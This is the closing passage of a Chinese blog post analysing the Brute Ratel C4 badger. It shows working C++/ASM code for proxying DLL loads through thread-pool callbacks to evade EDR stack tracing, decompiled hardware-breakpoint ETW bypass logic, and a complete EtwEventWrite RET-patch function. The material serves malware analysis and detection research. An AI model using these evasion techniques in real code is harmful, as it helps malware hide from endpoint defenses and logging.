<p>这里的检测技术非常聪明。一些EDR使用用户态钩子，而另一些则使用ETW来捕获堆栈遥测。例如，假设你想在没有模块踩踏的情况下执行你的shellcode。因此，您通过VirtualAlloc或相对的NTAPI NtAllocateVirtualMemory分配一些内存，然后复制您的shellcode并执行它。现在您的shellcode可能有自己的依赖项，它可能会调用<code>LoadLibraryA</code>或<code>LdrLoadDll</code>将dll从磁盘加载到内存中。如果你的EDR使用userland钩子，它们可能已经钩住<code>了LoadLibrary</code>和<code>LdrLoadDll</code>，在这种情况下，它们可以检查由RX shellcode区域压入堆栈的返回地址。这是特定于一些EDR像哨兵一号，Crowdstrike等，这将立即杀死你的有效载荷。 其他EDR，如Microsoft Defender ATP（MDATP），Elastic，FortiEDR将使用ETW或内核回调来检查<code>LoadLibrary</code>调用的来源。堆栈跟踪将提供返回地址的完整堆栈帧以及从那里开始调用<code>LoadLibrary</code>的所有函数。 简而言之，如果你执行一个DLL Sideload，它执行你的shellcode，调用<code>LoadLibrary</code>，它看起来像这样：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/f96083f569a4308667d26affa7ae5f3f-1729856473040-100.png"><br>这意味着任何在用户模式下或通过内核回调&#x2F;ETW挂接<code>LoadLibrary的</code>EDR都可以检查最后一个返回地址区域或调用的来源。在<a target="_blank" rel="noopener" href="https://bruteratel.com/release/2022/07/20/Release-Stoffels-Escape/">BRc 4的v1.1版本</a>中，我开始使用<code>RtlRegisterWait</code>API，它可以请求线程池中的工作线程在单独的线程中执行<code>LoadLibraryA</code>来加载库。一旦库被加载，我们可以通过简单地遍历PEB（进程环境块)来提取其基址。Nighthawk后来将此技术应用于<code>RtlWorkItem</code>API，它是<code>WorkUserWorkItem</code>背后的主要NTAPI，也可以将请求排队到工作线程以加载具有干净堆栈的库。然而，Proofpoint在去年的某个时候在他们的博客中对此进行了研究，最近Elastic的Joe Desimone也发布了一条关于BRc 4使用的<code>RtlRegisterWait</code>API的推文。 这意味着迟早会被检测到，并且需要更多这样的API来进一步规避。因此，我决定花一些时间从ntdll中反转一些未文档化的API，并发现至少<code>有27个不同的回调</code>，只要稍加调整和黑客攻击，就可以利用它们来加载我们的DLL。</p>
</blockquote>
<p>简而言之：就是在一个单独的，“干净的线程”中使用loadlibraryA</p>
<p><strong>下面是项目源代码：</strong><br><code>TpPostWork</code>调用<code>WorkCallback</code>，但<code>WorkCallback</code>不调用<code>LoadLibraryA</code>，而是跳转到它的指针。<code>WorkCallback</code>简单地将<code>RDX</code>寄存器中的库名称移动到<code>RCX</code>，擦除<code>RDX</code>，从adhoc函数获取<code>LoadLibraryA</code>的地址，然后跳转到<code>LoadLibraryA</code>，这最终重新排列整个堆栈帧，而不添加我们的返回地址。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">(NTAPI* TPALLOCWORK)</span><span class="params">(PTP_WORK* ptpWrk, PTP_WORK_CALLBACK pfnwkCallback, PVOID OptionalArg, PTP_CALLBACK_ENVIRON CallbackEnvironment)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">VOID</span> <span class="params">(NTAPI* TPPOSTWORK)</span><span class="params">(PTP_WORK)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">VOID</span> <span class="params">(NTAPI* TPRELEASEWORK)</span><span class="params">(PTP_WORK)</span></span>;</span><br><span class="line"></span><br><span class="line">FARPROC pLoadLibraryA;</span><br><span class="line"></span><br><span class="line"><span class="function">UINT_PTR <span class="title">getLoadLibraryA</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (UINT_PTR)pLoadLibraryA;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">extern</span> VOID CALLBACK <span class="title">WorkCallback</span><span class="params">(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    pLoadLibraryA = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;kernel32&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">    FARPROC pTpAllocWork = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll&quot;</span>), <span class="string">&quot;TpAllocWork&quot;</span>);</span><br><span class="line">    FARPROC pTpPostWork = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll&quot;</span>), <span class="string">&quot;TpPostWork&quot;</span>);</span><br><span class="line">    FARPROC pTpReleaseWork = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll&quot;</span>), <span class="string">&quot;TpReleaseWork&quot;</span>);</span><br><span class="line"></span><br><span class="line">    CHAR *libName = <span class="string">&quot;wininet.dll&quot;</span>;</span><br><span class="line">    PTP_WORK WorkReturn = <span class="literal">NULL</span>;</span><br><span class="line">    ((TPALLOCWORK)pTpAllocWork)(&amp;WorkReturn, (PTP_WORK_CALLBACK)WorkCallback, libName, <span class="literal">NULL</span>);</span><br><span class="line">    ((TPPOSTWORK)pTpPostWork)(WorkReturn);</span><br><span class="line">    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>((HANDLE)<span class="number">-1</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hWininet: %p\n&quot;</span>, <span class="built_in">GetModuleHandleA</span>(libName));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>**** 通过操作堆栈帧将WorkCallback重新路由到LoadLibrary的ASM代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> getLoadLibraryA</span><br><span class="line"></span><br><span class="line">global WorkCallback</span><br><span class="line">WorkCallback:</span><br><span class="line">    mov rcx, rdx</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    call getLoadLibraryA</span><br><span class="line">    jmp rax</span><br></pre></td></tr></table></figure>
<p>可以看到堆栈非常干净<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/6958401463ade15e48fa21630a852d50-1729856329175-2.png"></p>
<h3 id="规避ETW事件日志记录"><a href="#规避ETW事件日志记录" class="headerlink" title="规避ETW事件日志记录"></a>规避ETW事件日志记录</h3><blockquote>
<p>他们在ETW调用的两个常见函数“<strong>NtTraceEvent</strong>“和“<strong>NtTraceControl</strong>”上设置硬件断点，以记录进程事件。然后，它们注册自己的VEH来捕获EXCEPTION_SINGLE_STEP异常，这在命中硬件断点时发生。<br>过修补负责生成或跟踪系统事件的已知API来规避Windows事件跟踪（ETW）和AMSI Windows机制。</p>
<p>它使用“0xC3”操作码修补“EtwEventWrite”API，该操作码是一个“返回指令”，用于规避ETW事件跟踪日志记录。</p>
</blockquote>
<p>当断点被命中并且处理程序捕获时，执行被重定向到一个除了返回零之外什么也不做的伪函数。这会阻止实际的函数逻辑执行，因此不会记录事件。<br>内核是否在记录<br><strong>伪代码：</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == (<span class="type">unsigned</span> <span class="type">int</span>)EXCEPTION_SINGLE_STEP) <span class="comment">// check the code that triggered the handler (it triggers when a  </span></span><br><span class="line">&#123;  </span><br><span class="line">ExceptionAddress = ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionAddress; <span class="comment">// the address where the exception occured  </span></span><br><span class="line"><span class="keyword">if</span> (ExceptionAddress == (PVOID)NtTraceEvent)  <span class="comment">//</span></span><br><span class="line">&#123;  </span><br><span class="line">ContextRecord = ExceptionInfo-&gt;ContextRecord;   </span><br><span class="line">v4 = ret_0;  </span><br><span class="line">LABEL_9:  </span><br><span class="line">ContextRecord-&gt;Rip = (DWORD64)v4;  </span><br><span class="line"><span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL; </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span> (ExceptionAddress == (PVOID)NtTraceControl)  <span class="comment">//</span></span><br><span class="line">&#123;  </span><br><span class="line">ExceptionInfo-&gt;ContextRecord-&gt;Rip = (DWORD64)some_junk_ret_0;  </span><br><span class="line"><span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span> (qword_2B18D20 &amp;&amp; ExceptionAddress == (PVOID)qword_2B18D20)  </span><br><span class="line">&#123;  </span><br><span class="line">ContextRecord = ExceptionInfo-&gt;ContextRecord;  </span><br><span class="line">v4 = (_int64 (*)())sub_2AE3AB0;  </span><br><span class="line"><span class="keyword">goto</span> LABEL_9;  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">return</span> result;  </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hHandler = RtlAddVectoredExceptionHandler(<span class="number">1LL</span>, VectoredExceptionHandler); <span class="comment">// register a vector exception handler to be called first whenever a new exception occur  </span></span><br><span class="line"><span class="keyword">if</span> (hHandler)  </span><br><span class="line">setHWBP(<span class="number">0xFFFFFFFFFFFFFFFE</span>ULL, NtTraceControl, <span class="number">0LL</span>, v6);  </span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">https://xz.aliyun.com/t/14691?time__1311=GqAhYKBK0K7Ix05DKA4YTwmpditFG8jfeD</span><br><span class="line"></span><br><span class="line">ETW的组件是内置在Windows的内核当中的,使用整个Windows拥有了事件追踪和监控的能力,但是在用户称有部分ETW API,开发者用这些API进行交互使用.  </span><br><span class="line">下面是这些API  </span><br><span class="line">EtwEventWrite和EtwEventWriteEx.StartTraceA 和 StopTraceA.QueryAllTraces.可以通过内存补丁来修补这些API实现bypass ETW  </span><br><span class="line">代码如下  </span><br><span class="line">etwPatch 数组,其中包含了要写入 EtwEventWrite 函数的第一个字节(0xC3, 即 RET 指令)</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line">void patchETW() &#123;</span><br><span class="line">    void* etwAddr = GetProcAddress(GetModuleHandle(L&quot;ntdll.dll&quot;), &quot;EtwEventWrite&quot;);</span><br><span class="line">    char etwPatch[] = &#123; 0xC3 &#125;;</span><br><span class="line">    DWORD lpflOldProtect = 0;</span><br><span class="line">    unsigned __int64 memPage = 0x1000;</span><br><span class="line">    void* etwAddr_bk = etwAddr;</span><br><span class="line">    NtProtectVirtualMemory(hProc, (PVOID*)&amp;etwAddr_bk, (PSIZE_T)&amp;memPage, 0x04, &amp;lpflOldProtect);</span><br><span class="line">    NtWriteVirtualMemory(hProc, (LPVOID)etwAddr, (PVOID)etwPatch, sizeof(etwPatch), (SIZE_T*)nullptr);</span><br><span class="line">    NtProtectVirtualMemory(hProc, (PVOID*)&amp;etwAddr_bk, (PSIZE_T)&amp;memPage, lpflOldProtect, &amp;lpflOldProtect);</span><br><span class="line">    std::cout &lt;&lt; &quot;[+] Patched etw!\n&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>![](.&#x2F;..&#x2F;pic&#x2F;brute ratel C4 badger&#x2F;3955ffbf45af8c876e44bcf12cf2e84b.png)</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://helsome.gihub.io">helson</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://helsome.gihub.io/2024/10/25/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/">https://helsome.gihub.io/2024/10/25/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://helsome.gihub.io" target="_blank">infinite</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/reverse/">reverse</a></div><div class="post_share"><div class="social-share" data-image="/hexo-blog/source/avatar%20img.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/10/25/PE%E8%A7%A3%E6%9E%90%E5%99%A8%E7%BC%96%E5%86%99/" title="PE解析器编写"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">PE解析器编写</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/04/28/CobaltStrike-UPX%E8%84%B1%E5%A3%B3%E5%8A%A0%E5%A3%B3/" title="CobaltStrike UPX脱壳加壳"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-28</div><div class="title">CobaltStrike UPX脱壳加壳</div></div></a></div><div><a href="/2024/01/17/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%EF%BC%88%E8%87%AA%E7%94%A8%EF%BC%89/" title="PE文件浅析"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-01-17</div><div class="title">PE文件浅析</div></div></a></div><div><a href="/2024/04/28/dll%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/" title="dll injection（dll注入）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-28</div><div class="title">dll injection（dll注入）</div></div></a></div><div><a href="/2024/04/28/go%E8%AF%AD%E8%A8%80%E6%A0%B7%E6%9C%AC-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E7%89%B9%E7%82%B9/" title="go语言样本逆向分析特点"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-28</div><div class="title">go语言样本逆向分析特点</div></div></a></div><div><a href="/2024/07/08/wannacry/" title="wannacry勒索病毒加密解密过程分析"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-08</div><div class="title">wannacry勒索病毒加密解密过程分析</div></div></a></div><div><a href="/2024/10/25/PE%E8%A7%A3%E6%9E%90%E5%99%A8%E7%BC%96%E5%86%99/" title="PE解析器编写"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-25</div><div class="title">PE解析器编写</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/hexo-blog/source/avatar%20img.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">helson</div><div class="author-info__description">吾生有涯，其知无涯</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/helsome"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/helsome" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:huichuanh8@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E7%BA%BF%E6%B5%81%E7%A8%8B"><span class="toc-number">1.</span> <span class="toc-text">上线流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B6%E6%AE%B5%E4%B8%80%EF%BC%9A%E9%92%93%E9%B1%BC%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">阶段一：钓鱼过程分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B6%E6%AE%B5%E4%BA%8C%EF%BC%9Aversion-dll%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">阶段二：version.dll分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1%E4%B8%80%EF%BC%9A%E6%90%9C%E5%AF%BBRuntimebroker-exe%E8%BF%9B%E7%A8%8B"><span class="toc-number">3.1.</span> <span class="toc-text">任务一：搜寻Runtimebroker.exe进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1%E4%BA%8C%EF%BC%9A%E8%A7%A3%E5%AF%86shellcode"><span class="toc-number">3.2.</span> <span class="toc-text">任务二：解密shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1%E4%B8%89%EF%BC%9A%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">3.3.</span> <span class="toc-text">任务三：进程注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1%E5%9B%9B%EF%BC%9A%E5%B0%86shellcode-dump%E5%87%BA%E6%9D%A5"><span class="toc-number">3.4.</span> <span class="toc-text">任务四：将shellcode dump出来</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B6%E6%AE%B5%E4%B8%89%EF%BC%9A%E5%88%86%E6%9E%90shellcode"><span class="toc-number">4.</span> <span class="toc-text">阶段三：分析shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1%E4%B8%80%EF%BC%9A%E6%89%8B%E5%8A%A8%E5%8A%A0%E8%BD%BDshllcode"><span class="toc-number">4.1.</span> <span class="toc-text">任务一：手动加载shllcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1%E4%BA%8C%EF%BC%9Ashellcode%E5%88%86%E6%9E%90"><span class="toc-number">4.2.</span> <span class="toc-text">任务二：shellcode分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BRC-4%E6%9C%80%E7%BB%88%E6%9C%89%E6%95%88%E8%BD%BD%E8%8D%B7"><span class="toc-number">5.</span> <span class="toc-text">BRC 4最终有效载荷</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Unregister-DLL-load-callbacks-%E5%8F%96%E6%B6%88%E6%B3%A8%E5%86%8CDLL%E5%8A%A0%E8%BD%BD%E5%9B%9E%E8%B0%83"><span class="toc-number">5.1.</span> <span class="toc-text">Unregister DLL load callbacks  取消注册DLL加载回调</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%90%86DLL%E5%8A%A0%E8%BD%BD%E4%BB%A5%E9%9A%90%E8%97%8FETWTI%E5%A0%86%E6%A0%88%E8%B7%9F%E8%B8%AA-Proxying-DLL-Loads-To-Hide-From-ETWTI-Stack-Tracing"><span class="toc-number">5.2.</span> <span class="toc-text">代理DLL加载以隐藏ETWTI堆栈跟踪 Proxying DLL Loads To Hide From ETWTI Stack Tracing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%84%E9%81%BFETW%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95"><span class="toc-number">5.3.</span> <span class="toc-text">规避ETW事件日志记录</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/25/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/" title="brute ratel C4 badger全分析文档">brute ratel C4 badger全分析文档</a><time datetime="2024-10-25T11:37:08.000Z" title="发表于 2024-10-25 19:37:08">2024-10-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/25/PE%E8%A7%A3%E6%9E%90%E5%99%A8%E7%BC%96%E5%86%99/" title="PE解析器编写">PE解析器编写</a><time datetime="2024-10-25T11:29:28.000Z" title="发表于 2024-10-25 19:29:28">2024-10-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/25/%E5%88%A9%E7%94%A8dll%E9%80%9A%E7%9F%A5%E5%9B%9E%E8%B0%83%E5%8A%A0%E8%BD%BDshellcode/" title="利用dll通知回调加载shellcode">利用dll通知回调加载shellcode</a><time datetime="2024-10-25T10:50:38.000Z" title="发表于 2024-10-25 18:50:38">2024-10-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/23/os-cs162/" title="os cs162">os cs162</a><time datetime="2024-09-23T11:00:34.000Z" title="发表于 2024-09-23 19:00:34">2024-09-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/07/08/wannacry/" title="wannacry勒索病毒加密解密过程分析">wannacry勒索病毒加密解密过程分析</a><time datetime="2024-07-08T09:46:32.000Z" title="发表于 2024-07-08 17:46:32">2024-07-08</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By helson</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>